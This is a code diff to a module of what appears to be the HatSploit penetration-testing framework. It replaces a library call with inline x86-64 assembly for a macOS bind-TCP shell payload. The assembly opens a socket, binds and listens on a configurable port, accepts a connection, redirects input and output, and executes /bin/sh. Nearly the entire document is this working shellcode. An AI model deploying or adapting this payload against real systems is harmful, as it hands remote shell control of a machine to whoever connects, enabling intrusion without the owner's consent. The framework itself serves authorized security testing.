@@ -6,10 +6,13 @@
 #
 
 from hatsploit.lib.payload import Payload
-from hatloads import HatLoads
+
+from pex.assembler import Assembler
+from pex.socket import Socket
+from pex.type import Type
 
 
-class HatSploitPayload(Payload, HatLoads):
+class HatSploitPayload(Payload, Assembler, Socket, Type):
     details = {
         'Name': "macOS x64 Shell Bind TCP",
         'Payload': "macos/x64/shell_bind_tcp",
@@ -22,9 +25,69 @@ class HatSploitPayload(Payload, HatLoads):
     }
 
     def run(self):
-        return self.get_payload(
-            self.details['Platform'],
+        bport = self.pack_port(self.handler['BPORT']).hex()
+        shell = (self.shells['sh'][::-1] + b'/').hex()
+
+        return self.assemble(
             self.details['Architecture'],
-            f"shell_{self.details['Type']}",
-            self.handler,
+            f"""
+            start:
+                xor rdi, rdi
+                mov dil, 0x2
+                xor rsi, rsi
+                mov sil, 0x1
+                xor rdx, rdx
+
+                xor rax, rax
+                mov al, 2
+                ror rax, 0x28
+                mov al, 0x61
+                mov r12, rax
+                syscall
+
+                mov r9, rax
+                mov rdi, rax
+                xor rsi, rsi
+                push rsi
+                mov esi, 0x{bport}0101
+                sub esi, 1
+                push rsi
+                mov rsi, rsp
+                mov dl, 0x10
+                add r12b, 0x7
+                mov rax, r12
+                syscall
+
+                xor rsi, rsi
+                inc rsi
+                add r12b, 0x2
+                mov rax, r12
+                syscall
+
+                xor rsi, rsi
+                sub r12b, 0x4c
+                mov rax, r12
+                syscall
+
+                mov rdi, rax
+                xor rsi, rsi
+                add r12b, 0x3c
+                mov rax, r12
+                syscall
+
+                inc rsi
+                mov rax, r12
+                syscall
+
+                xor rsi, rsi
+                push rsi
+                mov rdi, 0x{shell}
+                push rdi
+                mov rdi, rsp
+                xor rdx, rdx
+
+                sub r12b, 0x1f
+                mov rax, r12
+                syscall
+            """
         )
